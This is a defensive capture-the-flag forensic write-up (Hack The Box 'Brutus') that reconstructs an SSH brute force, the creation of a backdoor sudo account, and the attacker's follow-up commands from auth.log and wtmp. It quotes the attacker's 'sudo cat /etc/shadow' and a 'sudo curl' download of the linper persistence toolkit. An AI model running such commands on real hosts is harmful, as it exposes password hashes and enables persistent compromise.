# Hack The Box — Sherlock: Brutus


| Field | Value |
|---|---|
| Platform | Hack The Box — Sherlocks |
| Name | Brutus |
| Difficulty | Very Easy |
| Category | DFIR |
| Artefacts | `auth.log` + `wtmp` (+ `utmp.py` parser shipped with the archive) |
| Date | 2026-11-23 |
| Tags | #linux #auth-log #wtmp #ssh #brute-force #persistence |

## TL;DR

> An internet-facing Ubuntu host on AWS was hit by an SSH password brute force from `65.2.161.68`, which guessed the **root** password. The attacker logged in interactively (session 37), created a backdoor account `cyberjunkie` with elevated privileges, logged out and came back as that user. Correlating `auth.log` (authentication, PIDs, session numbers, account changes) with `wtmp` (terminal sessions) was enough to rebuild the whole timeline.

## Scenario

A Confluence server running on an AWS Ubuntu instance was the target of an SSH brute force. Using only the authentication log and the login records, the task is to confirm the attack, identify which account was compromised, and reconstruct what the attacker did once inside: interactive sessions, persistence, and privileged commands.

## Artefacts and triage

| File | Type | SHA-256 | Notes |
|---|---|---|---|
| `Brutus.zip` | Archive (password `hacktheblue`) | stored in local `hashes.txt` | Original archive, hashed before extraction |
| `auth.log` | Text log (syslog format, no year) | — | sshd, PAM, CRON, sudo, useradd/groupadd/usermod events |
| `wtmp` | Binary login records | — | Two boots: 2024-01-25 (kernel 6.2.0-1017-aws) and 2024-03-06 (kernel 6.2.0-1018-aws) |
| `utmp.py` | Python parser | — | Converts `wtmp` to readable records |

**Tools:** `grep`, `awk`, `less`, the bundled `utmp.py`.

**Time zone:** all timestamps in this writeup are UTC. `utmp.py` prints times in the terminal's local zone, so it was run with `TZ=UTC`.

**Handling.** The archive was hashed, extracted into a separate folder, and the extracted files were made read-only (`chmod -R a-w extracted`); every derived output went to a separate `work/` folder.

```bash
sha256sum Brutus.zip | tee hashes.txt
7z x Brutus.zip -phacktheblue -oextracted && chmod -R a-w extracted
```

### Reading `wtmp`

`wtmp` is binary, so `cat` is useless. Recent Debian/Kali no longer ship a `last` that reads the legacy format (and `utmpdump` is gone from util-linux), so the parser shipped with the archive was used:

```bash
TZ=UTC python3 extracted/utmp.py extracted/wtmp > work/wtmp.txt
```

Trimmed to the useful columns, the boot of 2024-03-06 reads:

```text
time (UTC)            type        user          line    host
2024-03-06 06:17:15   BOOT_TIME   reboot
2024-03-06 06:19:55   USER        root          pts/0   203.101.190.9
2024-03-06 06:32:45   USER        root          pts/1   65.2.161.68      (PID 2549)
2024-03-06 06:37:24   DEAD                      pts/1                    (PID 2491)
2024-03-06 06:37:35   USER        cyberjunkie   pts/1   65.2.161.68      (PID 2667)
```

`203.101.190.9` appears in every boot since January, including the first `ubuntu` login after provisioning: it is the administrator's address. `65.2.161.68` only appears on 2024-03-06, which makes it the first lead.

## Investigation

### Task 1 — IP address used for the brute force

**Approach.** A brute force leaves a long burst of `Failed password` / `Invalid user` lines from the same source in a short window. Counting sources is quicker than scrolling:

```bash
grep -E "Failed password|Invalid user" extracted/auth.log \
  | grep -oE "from [0-9.]+" | sort | uniq -c | sort -rn
```

The failures come from `65.2.161.68`, packed into a few seconds just before 06:31:40 and cycling through usernames (`admin`, `backup`, `server_adm`, `root`, …): the pattern of an automated tool, not a person mistyping a password. It is the same address that shows up in `wtmp` only on the day of the incident.

**Answer:** `65.2.161.68`

### Task 2 — Account compromised by the brute force

**Approach.** A successful SSH password login is an `Accepted password` line. Filtering on the attacker's IP:

```bash
grep "65.2.161.68" extracted/auth.log | grep "Accepted"
```

```text
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port ... ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port ... ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port ... ssh2
```

**Answer:** `root`

### Task 3 — When the attacker logged in manually and opened a terminal session

**Approach.** My first instinct was the first `Accepted password` at **06:31:40** — wrong. Following the whole connection by its PID shows why:

```bash
grep "sshd\[2411\]" extracted/auth.log
```

```text
Mar  6 06:31:40 ... sshd[2411]: Accepted password for root from 65.2.161.68 ...
Mar  6 06:31:40 ... sshd[2411]: Disconnected from user root 65.2.161.68 ...
Mar  6 06:31:40 ... sshd[2411]: pam_unix(sshd:session): session closed for user root
```

Authentication, disconnect and session close happen in the same second: nobody typed anything. That is the brute-force tool validating the password it had just found. The human session is the next connection, `sshd[2491]`, which stays open for minutes and has activity inside it.

The question asks for the **terminal session**, which is recorded in `wtmp`, not in `auth.log`. The two differ by one second: `auth.log` logs the authentication (06:32:44), `wtmp` logs the moment the pty was allocated (06:32:45).

**Answer:** `2024-03-06 06:32:45`

### Task 4 — Session number assigned to the attacker's session

**Approach.** `systemd-logind` assigns a session number right after PAM opens the session for `sshd[2491]`:

```text
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

**Answer:** `37`

### Task 5 — Account created for persistence

**Approach.** Inside session 37 the log shows the shadow-utils tools at work. `useradd` first creates the user's primary group:

```text
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
```

```bash
grep -E "useradd|usermod|passwd|groupadd" extracted/auth.log
```

**Answer:** `cyberjunkie`

### Task 6 — MITRE ATT&CK sub-technique for persistence by creating an account

**Approach.** The evidence comes from the log, the classification from [attack.mitre.org](https://attack.mitre.org). I first answered **T1098.007** (*Account Manipulation: Additional Local or Domain Groups*). That technique is real and does describe the step where `cyberjunkie` is added to `sudo`, but the question is about **creating** the account, which is a separate technique: *Create Account* (T1136). The sub-technique is chosen by the kind of account: `useradd` on a standalone Linux host creates a **local** account.

**Answer:** `T1136.001` — Create Account: Local Account

### Task 7 — When the attacker's first SSH session ended, according to `auth.log`

**Approach.** Same connection (`sshd[2491]`, session 37), but the last lines instead of the first. A closing SSH session leaves `Received disconnect`, `Disconnected from user`, `session closed`, and then `systemd-logind` reports `Removed session 37`. The matching session number is the check that it is the right session. My first attempt gave 06:32:44 — the *opening* of the session, not its end.

```bash
grep -E "sshd\[2491\]|session 37" extracted/auth.log
```

```text
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port ...:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port ...
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
```

`wtmp` agrees: the `DEAD` record for `pts/1` with PID 2491 is at 06:37:24.

**Answer:** `2024-03-06 06:37:24`

### Task 8 — Command run with `sudo` from the backdoor account

**Approach.** Eleven seconds after session 37 closes, `wtmp` shows `cyberjunkie` logging in from the same IP (06:37:35). `sudo` logs every command with the full path in a `COMMAND=` field:

```bash
grep "sudo:" extracted/auth.log | grep "cyberjunkie"
```

```text
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

First the attacker tests the new privileges by reading `/etc/shadow`, then downloads **linper**, a public Linux persistence toolkit: a sign they intended to plant more backdoors.

**Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

## Attack timeline (UTC)

| Time (UTC) | Event | Source artefact |
|---|---|---|
| 2024-03-06 06:17:15 | Host boots (kernel 6.2.0-1018-aws) | `wtmp` BOOT_TIME |
| 2024-03-06 06:19:55 | Legitimate admin login as root from `203.101.190.9` (pts/0) | `wtmp` |
| 2024-03-06 06:31 (seconds before 06:31:40) | Brute force from `65.2.161.68` starts | `auth.log` Failed password / Invalid user |
| 2024-03-06 06:31:40 | Password for `root` guessed; tool logs in and out in the same second | `auth.log` sshd[2411] |
| 2024-03-06 06:32:44 | Attacker authenticates as root; session 37 opened | `auth.log` sshd[2491], systemd-logind |
| 2024-03-06 06:32:45 | Interactive terminal pts/1 allocated | `wtmp` USER |
| 2024-03-06 06:34:18 | Account `cyberjunkie` created (UID/GID 1002) | `auth.log` groupadd[2586], useradd[2592] |
| 2024-03-06 06:34:26 | Password set for `cyberjunkie` | `auth.log` passwd[2603] |
| 2024-03-06 06:35:15 | `cyberjunkie` added to `sudo` group | `auth.log` usermod[2628] |
| 2024-03-06 06:37:24 | Session 37 ends | `auth.log` sshd[2491] / Removed session 37; `wtmp` DEAD pts/1 |
| 2024-03-06 06:37:34 | Attacker authenticates as `cyberjunkie` | `auth.log` sshd[2667] |
| 2024-03-06 06:37:35 | Terminal pts/1 allocated for `cyberjunkie` | `wtmp` USER pts/1 |
| 2024-03-06 06:37:57 | `sudo cat /etc/shadow` | `auth.log` sudo |
| 2024-03-06 06:39:38 | `sudo curl` downloads `linper.sh` (persistence toolkit) | `auth.log` sudo |

## Indicators of compromise

| Type | Value | Context |
|---|---|---|
| IP | `65.2.161.68` | Source of the brute force and of all attacker sessions |
| Account | `root` | Compromised by password guessing |
| Account | `cyberjunkie` (GID 1002) | Backdoor account created for persistence, given sudo rights |
| URL | `https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` | Persistence toolkit downloaded via `sudo curl` |
| Command | `/usr/bin/cat /etc/shadow` | Credential access via `sudo` from the backdoor account |

## MITRE ATT&CK mapping

| Tactic | Technique | Evidence |
|---|---|---|
| Credential Access | T1110.001 — Brute Force: Password Guessing | Burst of failed SSH logins from `65.2.161.68` (Task 1) |
| Initial Access / Persistence | T1078.003 — Valid Accounts: Local Accounts | Interactive login as `root` with the guessed password (Tasks 2–3) |
| Persistence | T1136.001 — Create Account: Local Account | `groupadd`/`useradd` for `cyberjunkie` at 06:34:18 (Task 5) |
| Persistence / Privilege Escalation | T1098.007 — Account Manipulation: Additional Local or Domain Groups | `cyberjunkie` added to `sudo` (Task 5) |
| Credential Access | T1003.008 — OS Credential Dumping: /etc/passwd and /etc/shadow | `sudo cat /etc/shadow` at 06:37:57 |
| Command and Control | T1105 — Ingress Tool Transfer | `sudo curl` of `linper.sh` at 06:39:38 (Task 8) |

## Detection and response

- **Brute force (detect).** Dozens of `Failed password` lines from one IP within seconds is the easiest signal in this log. A threshold rule (e.g. *N failures from the same source in 60 s*) or `fail2ban` on `sshd` would have blocked the source long before the guess succeeded.
- **Root login over SSH (prevent).** The attacker went straight for `root`. `PermitRootLogin no` and `PasswordAuthentication no` (keys only) remove both the target and the attack: there is no password to guess. Restricting port 22 in the AWS security group to the admin's address (`203.101.190.9` is the only legitimate source in `wtmp`) closes the exposure entirely.
- **Success after failures (detect).** An `Accepted password` from an IP that just produced a burst of failures should be a high-severity alert, not a log line.
- **Account creation and group changes (detect).** `useradd` / `usermod -aG sudo` on a server are rare events. Alerting on them (auditd rules on `/etc/passwd`, `/etc/group`, `/etc/sudoers*`, or the shadow-utils log lines) catches persistence even after a successful login.
- **sudo by a brand-new account (detect).** A user created minutes earlier running `sudo` with a download tool is high-confidence malicious.
- **Response.** Block `65.2.161.68`; disable and remove `cyberjunkie` and check `/etc/sudoers.d/`, `authorized_keys`, crontabs and systemd units for further persistence; rotate the root password and any secrets on the host; review what the `sudo` command fetched and executed; treat the host as compromised and rebuild from a known-good image if the downloaded script ran.

## Lessons learned

- **The first successful login in a brute force is usually the tool, not the human.** Following a connection by its `sshd[PID]` shows whether anything happened inside it; a session that opens and closes in the same second is automation.
- **`auth.log` and `wtmp` record different moments.** Authentication vs terminal allocation can differ by a second: read which artefact the question names before copying a timestamp.
- **Session start vs session end.** The same PID and session number tie the opening (`New session 37`) to the closing (`Removed session 37`).
- **MITRE questions have two halves:** the evidence from the logs and the classification from the ATT&CK site. Neighbouring techniques (Create Account vs Account Manipulation) are easy to mix up; the verb in the question picks the technique.
- **Tooling.** Modern Kali cannot read legacy `wtmp` with `last`; the bundled `utmp.py` with `TZ=UTC` works. Shell variables (`$ART`, `TZ`) live only in the terminal that set them.

## References

- MITRE ATT&CK — [T1110.001](https://attack.mitre.org/techniques/T1110/001/), [T1078.003](https://attack.mitre.org/techniques/T1078/003/), [T1136.001](https://attack.mitre.org/techniques/T1136/001/), [T1098.007](https://attack.mitre.org/techniques/T1098/007/), [T1003.008](https://attack.mitre.org/techniques/T1003/008/), [T1105](https://attack.mitre.org/techniques/T1105/)
- linper — [montysecurity/linper](https://github.com/montysecurity/linper)
- `man sshd_config` (`PermitRootLogin`, `PasswordAuthentication`), `man wtmp`, `man useradd`, `man usermod`
- fail2ban — `sshd` jail
